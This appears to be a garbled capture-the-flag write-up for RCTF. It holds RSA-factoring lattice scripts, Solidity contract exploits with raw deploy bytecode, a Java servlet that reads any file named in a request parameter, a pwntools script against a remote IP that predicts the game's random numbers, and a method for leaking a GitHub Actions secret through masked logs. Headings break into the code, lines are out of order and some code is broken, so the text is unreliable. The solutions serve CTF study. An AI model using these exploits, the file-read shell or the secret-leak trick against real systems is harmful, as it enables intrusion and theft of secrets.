for i in tqdm(range(19)):
    new_n = []
    for j in range(len(n)//2):
        new_n.append(mpz(n[2*j]*n[2*j+1]))
Uncommon Factors II
    n = new_n
for i in range(len(n)):
    for j in range(i+1,len(n)):
        print(i,j,gmpy2.gcd(n[i],n[j]))
from Crypto.Util.number import bytes_to_long
with open("lN2.bin","rb") as f:
    data = f.read()
N = []
for i in range(128):
    N.append(bytes_to_long(data[64*i:64*i+64]))
from itertools import permutations
P_bits = 312
Q_bits = 200
R_bits = 304
X = 2**R_bits
m = len(N)
PR = PolynomialRing(ZZ, names=[str('x%d' % i) for i in range(1, 1 + m)])
h = 3
u = 1
variables = PR.gens()
gg = []
monomials = [variables[0]**0]
for i in range(m):
    gg.append(N[i] - variables[i])
    monomials.append(variables[i])
print(len(monomials), len(gg))
print('monomials:', monomials)
B = Matrix(ZZ, len(gg), len(monomials))
for ii in range(len(gg)):
    for jj in range(len(monomials)):
        if monomials[jj] in gg[ii].monomials():
            B[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj]([X] 
* m)
BlockChain
EasyFJump
bytecode 逆向结果：
B = B.LLL()
print('-' * 32)
new_pol = []
for i in range(len(gg)):
    tmp_pol = 0
    for j in range(len(monomials)):
        tmp_pol += monomials[j](variables) * B[i, j] / monomials[j]([X] * m)
    new_pol.append(tmp_pol)
if len(new_pol) > 0:
    Ideal = ideal(new_pol[:m-1])
    GB = Ideal.groebner_basis()
    function_variables = var([str('y%d' % i) for i in range(1, 1 + m)])
    res = solve([pol(function_variables) for pol in GB], function_variables)
    print('got %d basis' % len(GB))
    print('solved result:')
    print(res)
    for tmp_res in res:
        PRRR. = PolynomialRing(QQ)
        q = abs(PRRR(res[0][0](x, y)).coefficients()[0].denominator())
        p = N[-1] // q
        print(p)
contract translate{
  bytes32 a;
  bytes32 b;
  bytes32 c;
  bytes32 d;
  function _0b21d525(bytes memory x) public{
    a = msg.data[0x04:0x24];
    b = msg.data[0x24:0x44];
    c = msg.data[0x44:0x64];
  }
  function _89068995() public{
    bytes32 i = 0x0335;
    d1 = func_02F8() == 0x01f06512dec2c2c6e8ab35
    d2 = func_02F8() == 0x02b262ac4c65fddc17c7d5
    d3 = func_02F8() == 0x02125ed5d7ddf56b0eba28
    d4 = func_02F8() == 0x018fbbc52638a0f3d00fee
HackChain
部分逆向：
    bytes32 i = 0x00d8;
    var3 = (a - b - c) & 0xffff;
    target = 0x00d8 +msg.value - var3 == 0x01B;
  }
  function func_02F8() private{
    var var0 = 0x00;
    var var1 = c;
    var var2 = d * a + b;
    require(c!=0);
    d = (d * a + b) %c;
    return d;
  }
}
from math import gcd
from Crypto.Util.number import inverse
from functools import reduce
data = 
[0x0259c30dc979a94f999,0x01f06512dec2c2c6e8ab35,0x02b262ac4c65fddc17c7d5,0x02125ed5d7dd
f56b0eba28,0x018fbbc52638a0f3d00fee]
delta = [d1 - d0 for (d0, d1) in zip(data, data[1:])]
m_mul = [d0 * d2 - d1 * d1 for (d0, d1, d2) in zip(delta, delta[1:], delta[2:])]
m = reduce(gcd, m_mul)
a = delta[1]*inverse(delta[0],m)%m
b = (data[1]-data[0]*a)%m
print(a, b, m)
contract Contract{
event ForFlag(address addr);
struct Func {
function() internal f;
}
function execure(address addr){
require(address(this).balance == addr&0x0fff); //0xea8结尾
(bool success, bytes memory ??) = addr.delegatecall(
构造合约1:
构造合约2:
abi.encodeWithSignature("execure(address)", addr?)
);
require(!success));
require(data[:4] ==  keccak256(0x676574666c61672875696e7432353629)[:4]);
assembly {
mstore(func, sub(add(mload(func), data[4:]), address(this).balance))
}  // 0x4c3
func.f(); // => 0x3c6
}
}
contract exp{
fallback(bytes calldata) external returns(bytes memory a){
assembly{
mstore8(0,0xdd)
mstore8(1,0xdc)
mstore8(2,0x5b)
mstore8(3,0xbf)
mstore(4,0xc8f)
revert(0,0x24)
}
}
}
bytes contractBytecode = 
hex"6080604052348015600f57600080fd5b50606b80601d6000396000f3fe6080604052348015600f57600
080fd5b50600036606060dd60005360dc600153605b60025360bf600353610c8f60045260246000fdfea264
69706673582212204fb9a4d0ca8ea1d456a492ddd96c0fba225975532a908355f8e9f8f1b97dfcf364736f6
c63430008000033";
function deploy(bytes32 salt) public{
bytes memory bytecode = contractBytecode;
address addr;
调⽤tx，deploy合约3（0xbfe391bac53c9df7696aedc915f75ca451f66bad）
最后exercise
0xbfe391bac53c9df7696aedc915f75ca451f66bad
Misc
ezshell
assembly {
addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
}
}
}
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
public class test123 {
    public void e(Object request, Object response){
        HttpServletRequest httpServletRequest=(HttpServletRequest)request;
        HttpServletResponse httpServletResponse=(HttpServletResponse)response;
        File file = new File(httpServletRequest.getParameter("file"));
        InputStream in = null;
        try{
            in = new FileInputStream(file);
            int tempbyte;
            while ((tempbyte = in.read()) != -1) {
                httpServletResponse.getWriter().write(tempbyte);
            }
        }catch (Exception e){
        }
    }
}
monopoly
玩⼤富翁，困难模式玩赢给Flag
玩完困难模式之后玩家信息不清空，可以进⾏SL⼤法
每次可以重载⼀个随机种⼦，并且AI⼀定⽐玩家后⾏动，然后玩家会再⾛⼀步，然后选择不玩了的话下⼀次⼜是玩
家⾛
每次重载了之后钱、位置不清空，但是资产信息清空了，所以只能⽤机会格⼦去赚钱，机会格⼦roll的点也是rand
⽣成的，所以也可以预测，每次都想办法让它去翻2倍就⾏了
from pwn import *
import ctypes
# context.log_level = 'DEBUG'
cdll = ctypes.CDLL('./libc-2.27.so')
p = remote('123.60.25.24', 20031)
p.recvuntil('what\\'s your name?')
p.sendline('acdxvfsvd')
money = 0
ai_money = 0
pos = 0
ai_pos = 0
types = [1] * 64
types[0] = 0
types[16] = 2
types[32] = 2
types[48] = 2
types[11] = 2
types[19] = 2
types[26] = 2
types[37] = 2
types[56] = 2
types[3] = 3
types[22] = 3
types[40] = 3
types[51] = 3
def new_game(seed):
    p.recvuntil('3. hard level!!!!')
    p.recvuntil('input your choice>>')
    p.sendline('3')
    p.recvuntil('you choice hard level, you can choice a seed to help you win the 
game!')
    p.sendline(str(seed))
def player_turn():
    global pos, ai_pos
    p.recvuntil('your money: ')
    money = int(p.recvline().strip())
    p.recvuntil('acdxvfsvd throw')
    val = int(p.recvuntil(',')[:-1])
    p.recvuntil('now location:')
    pos = int(p.recvuntil(',')[:-1])
    log.info("player money {}, throw {}, pos {}".format(money, val, pos))
    p.recvline()
    if pos == 0:
        return '0'
    nex = p.recvline()
    if ('free parking' in nex):
        owner = 'free'
    elif 'owner' in nex:
        owner = nex[nex.index(':')+1:].strip()
    elif ('chance' in nex):
        owner = 'chance'
    else:
        print nex
    log.info('owner {}'.format(owner))
    return owner
def ai_turn():
    global ai_pos
    p.recvuntil('ai money: ')
    ai_money = int(p.recvline().strip())
    p.recvuntil('AI throw')
    val = int(p.recvuntil(',')[:-1])
    p.recvuntil('now location:')
    ai_pos = int(p.recvuntil(',')[:-1])
    log.info("ai money {}, throw {}, pos {}".format(ai_money, val, ai_pos))
    p.recvline()
    if (ai_pos == 0):
        return '0'
    nex = p.recvline()
    if ('free parking' in nex):
        owner = 'free'
    elif 'owner' in nex:
        owner = nex[nex.index(':')+1:].strip()
    elif ('chance' in nex):
        owner = 'chance'
    else:
        print nex
    log.info("owner {}".format(owner))
    return owner
def calculate_seed():
    flag = 0
    for i in range(1, 13):
        if (types[(i + pos) % 64] == 3):
            flag = 1
        elif (flag == 0 and types[(i + pos) % 64] == 2 or types[(i + pos) % 64] == 0):
            flag = 2
    print('flag', flag)
    for seed in range(1, 100000000):
        cdll.srand(seed)
        if (flag == 1):
            r1 = (cdll.rand() & 0xff) % 0xc + 1
            next_pos = (pos + r1) % 64
            if (types[next_pos] != 3):
                continue
            chance = cdll.rand() & 0xff
            # print(hex(chance))
            if (chance <= 0xef):
                continue
            # return seed
        # elif (flag == 2):
        #    r1 = (cdll.rand() & 0xff) % 0xc + 1
        #    next_pos = (pos + r1) % 64
        #    if (types[next_pos] != 0 and types[next_pos] != 2):
        #        continue
            # return seed
        else:
            r1 = (cdll.rand() & 0xff) % 0xc + 1
            next_pos = (pos + r1) % 64
        #     if (types[next_pos] == 2):
        #         chance = cdll.rand() & 0xff
        #         if (chance <= 0x9f):
        #             continue
        r2 = (cdll.rand() & 0xff) % 0xc + 1
        ai_next_pos = (ai_pos + r2) % 64
checkin
github actions题，需要泄漏secret
github actions log特性，会匹配secret改成星号，issue中输⼊00000 - 99999所有数字，看actions的构建⽇志，
被打星号的就是secret
coolcat
每个像素⽬标位置为⼆元递推式，考虑构造矩阵
mat1=[ x y ]，mat2=[ 1 p ]
           [ q p+q]
        if (types[ai_next_pos] == 2):
            chance = cdll.rand() & 0xff
        r3 = (cdll.rand() & 0xff) % 0xc + 1
        print(pos, r1, ai_pos, r2)
        n_next_pos = (pos + r1 + r3) % 64
        # if (types[n_next_pos] not in [2,0,1]):
        if (types[n_next_pos] == 1):
            log.info('Stage 1 Seed {}'.format(seed))
            return seed, types[n_next_pos] 
new_game(17)
for i in range(4):
    print(i)
    x = player_turn()
    if (x == 'nobody'):
        p.sendline('2')
    elif (x == 'acdxvfsvd'):
        p.sendline('2')
    a = ai_turn() 
    x = player_turn()
    while (x in ['free', '0', 'chance']):
        a = ai_turn() 
        x = player_turn()
    p.sendline('4')
    seed, new_type = calculate_seed()
    new_game(seed)
    print types
# iter 5 val 54
p.sendline('4')
p.sendline('3')
p.sendline('54')
p.interactive()
则有destpos=mat1*mat2**m，其中p，q，m为密钥
容易构造特殊的mat1，直接得出(mat2**m)%600
根据矩阵乘法结合律可解出所有像素的对应位置
(mat2**m)%600=
解密脚本
RCTF{RCTFNB666MyBaby}
welcome_to_rctf
签到
FeedBack
签退
(409 336)
(336 433)
k=cv2.imread("enced.jpg")
o=np.zeros((600,600,3),'uint8')
for i in range(600):
    for j in range(600):
        o[i][j]=k[(i*409+j*336)%600][(i*336+j*433)%600]
print(o)
cv2.imwrite("out.jpg",o)